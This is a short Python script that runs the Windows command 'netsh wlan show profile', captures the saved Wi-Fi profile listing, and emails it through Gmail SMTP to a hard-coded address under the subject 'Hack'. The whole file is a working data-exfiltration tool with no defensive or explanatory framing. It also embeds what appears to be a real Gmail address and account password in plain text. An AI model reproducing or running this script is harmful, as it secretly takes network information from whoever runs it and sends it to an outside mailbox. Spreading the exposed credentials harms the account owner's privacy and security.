import subprocess, smtplib

def send_email(sender_email, sender_password, receiver_email, subject, message):
    txt = f"Subject: {subject}\n\n{message.decode('utf-7')}"

    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(sender_email, sender_password)
    
    server.sendmail(sender_email, receiver_email, txt)
    #print("Email sent to " + receiver_email)
    server.quit()

# Example usage
email = "laverna1914@gmail.com"
password = "xjqhdjkkxnemrhcv"
receivers_mail = "laverna1914@gmail.com"
subject = "Hack"
command = "netsh wlan show profile "
output = subprocess.check_output(command, shell =True)
send_email(email, password, receivers_mail, subject, output)